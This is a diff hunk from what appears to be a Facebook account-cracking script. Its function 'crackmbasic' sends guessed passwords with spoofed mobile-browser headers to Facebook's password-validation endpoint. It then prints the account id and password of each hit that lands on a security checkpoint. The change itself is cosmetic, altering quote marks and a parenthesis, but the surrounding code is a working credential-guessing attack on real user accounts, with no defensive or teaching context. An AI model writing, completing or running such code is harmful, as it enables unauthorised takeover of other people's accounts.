@@ -615,8 +615,8 @@ def crackmbasic(idf,pwv):
 			       'sec-fetch-mode': 'navigate',
 			       'sec-fetch-dest': 'document',
 			       'referer':'https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D542599432471018%26redirect_uri%3Dhttps%253A%252F%252Fmedium.com%252Fm%252Fcallback%252Ffacebook%26scope%3Dpublic_profile%252Cemail%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%26response_type%3Dtoken%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D51f6b7c3-e4b9-4003-938d-568af35e4366%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmedium.com%2Fm%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook-%257Chttps%253A%252F%252Fmedium.com%252F%253Fsource%253Dlogin--------------------------lo_home_nav-----------%257Clogin%257Cb4222fa6cc3f75a8f10e683e15ac4f26%257Cb938f2370960074ec87fa66231d0f22a4717a4a891abc9f9a4eaeb18b9608cdf%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr',
-			       "accept-encoding":"gzip, deflate br",
-			       "accept-language":"en-US,en;q=0.9"})
+			       'accept-encoding':'gzip, deflate br',
+			       'accept-language':'en-US,en;q=0.9'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
